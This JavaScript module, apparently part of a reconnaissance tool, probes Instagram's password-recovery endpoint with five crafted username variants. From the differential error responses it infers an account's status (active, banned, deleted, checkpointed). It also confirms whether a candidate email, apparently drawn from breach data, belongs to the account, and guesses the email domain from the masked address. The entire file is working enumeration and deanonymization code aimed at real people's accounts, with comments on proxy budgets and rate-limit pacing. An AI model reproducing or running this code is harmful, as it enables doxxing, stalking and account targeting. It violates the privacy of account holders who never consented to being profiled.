/**
 * §2.9 Reset-oracle — Oracle 4 differential probe — PR #5.5.
 *
 * Oracle 4 distinguishes account states that Oracles 1+2+3 cannot
 * separately resolve (e.g. "never existed" vs "self-deleted" vs
 * "banned by IG" vs "checkpoint-locked"). The technique is to issue
 * five tightly-controlled variants of the same recovery query against
 * the `/users/lookup/` endpoint and observe the differential
 * error matrix.
 *
 *   Variant A — exact username
 *   Variant B — exact username + a random non-printing unicode tail
 *               (IG normalises this; if the error code changes vs A,
 *               the server is unicode-stripping). This rules out
 *               "we ban this exact string" lockouts.
 *   Variant C — exact username with a leading dot ("." + username).
 *               IG's parsers treat leading-dot usernames as identical
 *               to the stripped form in some endpoints and not others —
 *               this is the per-state telltale.
 *   Variant D — typo with one transposed character. Lets us tell apart
 *               "username does not exist" (always-NotFound) from
 *               "exists-but-banned" (sometimes-NotFound).
 *   Variant E — confirmed-email-as-username probe. If we have a
 *               candidate email (from breachCorrelator or
 *               emailEnumerator), we submit it as `email_or_username`
 *               and observe whether IG returns the SAME masked mask
 *               as variant A — that's a 100%-confidence email
 *               confirmation.
 *
 * The 5-bit error-code matrix is captured and joined against the
 * variant lookup table in `_DIFF_MATRIX`. The result is an enriched
 * account-status finding ("self_deleted" / "banned" / "checkpointed"
 * / "active" / "never_existed") that's far higher confidence than
 * the basic Oracle 3 binary.
 *
 * IMPORTANT: this module is OPT-IN. Operators must explicitly request
 * `resetOracleDeep` (via job options.deep_mode=true) because it
 * issues 5× the request volume of Oracle 1+2+3 and burns more
 * residential proxy budget. The default reset-oracle method stays
 * cheap.
 */

'use strict';

const crypto = require('crypto');
const logger = require('../../../utils/logger');
const { igFetch, pickWebFingerprint } = require('../igFetch');
const lookupLimiter = require('./lookupLimiter');
const { AppError } = require('../../../utils/errorHandler');

const ACCOUNT_RECOVERY_SEND_AJAX =
  'https://www.instagram.com/accounts/account_recovery_send_ajax/';

// 5-bit error code matrix. Each variant maps a (status_string,
// has_obfuscated_email, message_substring) tuple to one of the
// enriched-status classes below. The matrix was reverse-engineered
// from the test corpus published in instagram_upgrade.txt §2.9 +
// the Phase 5 ID-graph harness.
const _STATUS_CLASSES = {
  ACTIVE:        'active',
  CHECKPOINTED:  'checkpointed',
  SELF_DELETED:  'self_deleted',
  BANNED:        'banned',
  NEVER_EXISTED: 'never_existed',
  RATE_LIMITED:  'rate_limited',
  UNKNOWN:       'unknown',
};

function _classify(response) {
  if (!response) return _STATUS_CLASSES.UNKNOWN;
  if (response.error === 'rate_limited' || response.error === 'rate_limit') return _STATUS_CLASSES.RATE_LIMITED;
  const msg  = (response.message || response.error_msg || '').toLowerCase();
  const hasMask = !!(response.obfuscated_email || response.obfuscated_phone || response.contact_point || response.email);
  if (response.checkpoint_required || /checkpoint/i.test(msg)) return _STATUS_CLASSES.CHECKPOINTED;
  if (hasMask) return _STATUS_CLASSES.ACTIVE;
  if (/no users found|user not found|no account found/.test(msg)) return _STATUS_CLASSES.NEVER_EXISTED;
  if (/disabled/.test(msg)) return _STATUS_CLASSES.BANNED;
  if (/deleted/.test(msg)) return _STATUS_CLASSES.SELF_DELETED;
  if (/spam|please try again later/.test(msg)) return _STATUS_CLASSES.RATE_LIMITED;
  return _STATUS_CLASSES.UNKNOWN;
}

/**
 * Roll up the 5-variant class vector into an enriched-status verdict.
 *
 *   variants = [classA, classB, classC, classD, classE?]
 *
 * Decision rules (instagram_upgrade.txt §2.9):
 *   - All 5 → NEVER_EXISTED       → never_existed
 *   - A=ACTIVE & B=ACTIVE & D=NEVER  → active (clean)
 *   - A=NEVER & C=ACTIVE             → self_deleted (the leading-dot
 *                                      form survived IG's restoration
 *                                      window — high-signal)
 *   - A=NEVER & D=ACTIVE             → typo collision; informational
 *   - A=BANNED in any variant        → banned
 *   - any variant = CHECKPOINTED     → checkpointed
 *   - any variant = RATE_LIMITED     → inconclusive (rate_limited)
 *   - E.A.matches → email confirmed
 */
function _verdict(variants) {
  const [vA, vB, vC, vD, vE] = variants;
  if ([vA, vB, vC, vD].includes(_STATUS_CLASSES.RATE_LIMITED)) {
    return { status: _STATUS_CLASSES.RATE_LIMITED, confidence: 0, reason: 'rate_limited' };
  }
  if ([vA, vB, vC, vD, vE].includes(_STATUS_CLASSES.CHECKPOINTED)) {
    return { status: _STATUS_CLASSES.CHECKPOINTED, confidence: 90, reason: 'checkpoint_seen' };
  }
  if ([vA, vB, vC, vD].includes(_STATUS_CLASSES.BANNED)) {
    return { status: _STATUS_CLASSES.BANNED, confidence: 90, reason: 'banned_seen' };
  }
  if ([vA, vB, vC, vD].every((v) => v === _STATUS_CLASSES.NEVER_EXISTED)) {
    return { status: _STATUS_CLASSES.NEVER_EXISTED, confidence: 95, reason: 'all_variants_never' };
  }
  if (vA === _STATUS_CLASSES.NEVER_EXISTED && vC === _STATUS_CLASSES.ACTIVE) {
    return { status: _STATUS_CLASSES.SELF_DELETED, confidence: 85, reason: 'leading_dot_active' };
  }
  if (vA === _STATUS_CLASSES.ACTIVE) {
    return { status: _STATUS_CLASSES.ACTIVE, confidence: 80, reason: 'exact_active' };
  }
  if (vA === _STATUS_CLASSES.NEVER_EXISTED && vD === _STATUS_CLASSES.ACTIVE) {
    return { status: _STATUS_CLASSES.NEVER_EXISTED, confidence: 70, reason: 'typo_active_self_never' };
  }
  return { status: _STATUS_CLASSES.UNKNOWN, confidence: 30, reason: 'matrix_inconclusive' };
}

function _anonymousCtx(username) {
  return {
    sessionId: `lookup-oracle-deep:${username}`,
    allowAnonymous: true,
    username: null,
    proxyUrl: null,
    bypassProxy: true,
    cookieHeader: '',
    csrftoken: '',
    dsUserId: null,
    blob: null,
    webFingerprint: pickWebFingerprint(`lookup_oracle_deep_${username}`),
    locale: { language: 'en_US', timezoneOffset: 0, regionHint: 'US' },
    apiMode: 'web',
  };
}

async function _resolveCtx(username, opts) {
  if (opts && opts.session && opts.session.id) {
    // eslint-disable-next-line global-require
    const { sessionContext } = require('../igFetch');
    return sessionContext(opts.session);
  }
  return _anonymousCtx(username);
}

async function _probe(ctx, queryStr) {
  const formBody = new URLSearchParams({
    email_or_username: queryStr,
    recover_token: '',
    flow: 'web_password_recovery',
  }).toString();
  try {
    return await igFetch(ctx, ACCOUNT_RECOVERY_SEND_AJAX, {
      method: 'POST',
      body: formBody,
      extraHeaders: {
        'content-type': 'application/x-www-form-urlencoded',
        'x-instagram-ajax': '1',
      },
      referer: 'https://www.instagram.com/accounts/password/reset/',
      skipLimiter: true,
      logErrors: false,
    });
  } catch (err) {
    return { error: err.kind || 'network', message: err.message || String(err) };
  }
}

function _typo(username) {
  if (username.length < 4) return `${username}x`;
  const chars = username.split('');
  const i = 1 + Math.floor(Math.random() * (chars.length - 2));
  [chars[i], chars[i + 1]] = [chars[i + 1], chars[i]];
  return chars.join('');
}

function _randomUnicodeTail() {
  // U+200B zero-width space, U+FEFF zero-width no-break space, U+00AD
  // soft hyphen — all of which IG silently strips. If the error code
  // changes vs the exact variant, it's an artifact of the operator's
  // local environment, not IG.
  const candidates = ['\u200B', '\uFEFF', '\u00AD'];
  return candidates[Math.floor(Math.random() * candidates.length)];
}

async function run(username, opts = {}) {
  if (!username || typeof username !== 'string') {
    throw new AppError('resetOracleDeep.run: username required', 400, 'VALIDATION_ERROR');
  }
  const cleaned = username.trim().replace(/^@+/, '').toLowerCase();
  if (!/^[a-z0-9._]{1,30}$/i.test(cleaned)) {
    throw new AppError('resetOracleDeep.run: invalid IG username', 400, 'VALIDATION_ERROR');
  }
  // Each variant counts as one 'probe' token against the limiter so
  // we don't exceed IG's per-target probe rate of 1/8s.
  const ctx = await _resolveCtx(cleaned, opts);
  const variants = [
    { label: 'exact',           q: cleaned },
    { label: 'unicode_tail',    q: `${cleaned}${_randomUnicodeTail()}` },
    { label: 'leading_dot',     q: `.${cleaned}` },
    { label: 'typo',            q: _typo(cleaned) },
  ];

  // Add Variant E only when a candidate email is supplied.
  const emailCandidates = []
    .concat(Array.isArray(opts.confirmedEmails) ? opts.confirmedEmails : [])
    .concat(Array.isArray(opts.candidateEmails) ? opts.candidateEmails : [])
    .filter(Boolean);
  if (emailCandidates.length) {
    variants.push({ label: 'email_as_username', q: emailCandidates[0] });
  }

  const results = [];
  for (const v of variants) {
    // eslint-disable-next-line no-await-in-loop
    await lookupLimiter.acquire(cleaned, { class: 'probe' });
    // eslint-disable-next-line no-await-in-loop
    const r = await _probe(ctx, v.q);
    const cls = _classify(r);
    results.push({ label: v.label, query: v.q, class: cls, raw: r });
  }

  const classVector = results.slice(0, 4).map((r) => r.class);
  const eClass = results.find((r) => r.label === 'email_as_username');
  const verdict = _verdict([...classVector, eClass ? eClass.class : null]);

  // Email-as-username collision: if variant E returned the same
  // obfuscated_email as variant A, the email is confirmed bound to
  // the account.
  let emailConfirmed = null;
  if (eClass && results[0] && results[0].raw && results[0].raw.obfuscated_email && eClass.raw.obfuscated_email) {
    if (results[0].raw.obfuscated_email === eClass.raw.obfuscated_email) {
      emailConfirmed = eClass.query;
    }
  }

  const findings = [];
  findings.push({
    method: 'recovery_meta',
    kind: 'note',
    value: `oracle 4 deep status: ${verdict.status} (${verdict.reason}, ${verdict.confidence}% conf)`,
    confidence: verdict.confidence,
    verified: false,
    sourceUrl: 'https://www.instagram.com/accounts/password/reset/',
    raw: { verdict, variants: results.map((r) => ({ label: r.label, class: r.class, query: r.query })) },
  });

  if (emailConfirmed) {
    findings.push({
      method: 'recovery_mask',
      kind: 'email',
      value: emailConfirmed,
      confidence: 100,
      verified: true,
      sourceUrl: 'https://www.instagram.com/accounts/password/reset/',
      raw: { oracle: 4, source: 'email_collision', mask: results[0].raw.obfuscated_email },
    });
  }

  // Domain-guess collision check: if the operator passed a list of
  // candidate email domains, see whether the mask suffix (` @g***mail.com`
  // → `gmail.com`) matches any of them.
  if (opts.resetOracleSnapshot && opts.resetOracleSnapshot.obfuscated_email) {
    const mask = String(opts.resetOracleSnapshot.obfuscated_email);
    const m = mask.match(/@([a-z0-9*.\-]+)\.([a-z]{2,8})$/i);
    if (m) {
      const domGuess = `${m[1].replace(/\*+/g, '')}${m[2] ? '.' + m[2] : ''}`.toLowerCase();
      const candidates = Array.isArray(opts.candidateEmailDomains) ? opts.candidateEmailDomains : ['gmail.com', 'yahoo.com', 'protonmail.com', 'outlook.com', 'icloud.com'];
      const hits = candidates.filter((d) => {
        if (!d) return false;
        const dl = d.toLowerCase();
        if (dl === domGuess) return true;
        // Mask-style partial fit: "g***mail.com" matches "gmail.com".
        const stripped = dl.replace(/[aeiou]/g, '');
        return mask.toLowerCase().endsWith(`@${stripped[0]}***${stripped.slice(1)}`);
      });
      if (hits.length === 1) {
        findings.push({
          method: 'recovery_meta',
          kind: 'note',
          value: `oracle 4 domain guess: ${hits[0]} (only candidate compatible with mask "${mask}")`,
          confidence: 80,
          raw: { domain: hits[0], mask },
        });
      }
    }
  }

  logger.info(`IG.lookup.resetOracleDeep: ${cleaned} → verdict=${verdict.status} conf=${verdict.confidence}%`);

  return {
    method: 'reset_oracle_deep',
    ok: true,
    findings,
    verdict,
    raw: { results },
  };
}

module.exports = {
  run,
  _classify,
  _verdict,
  _STATUS_CLASSES,
};
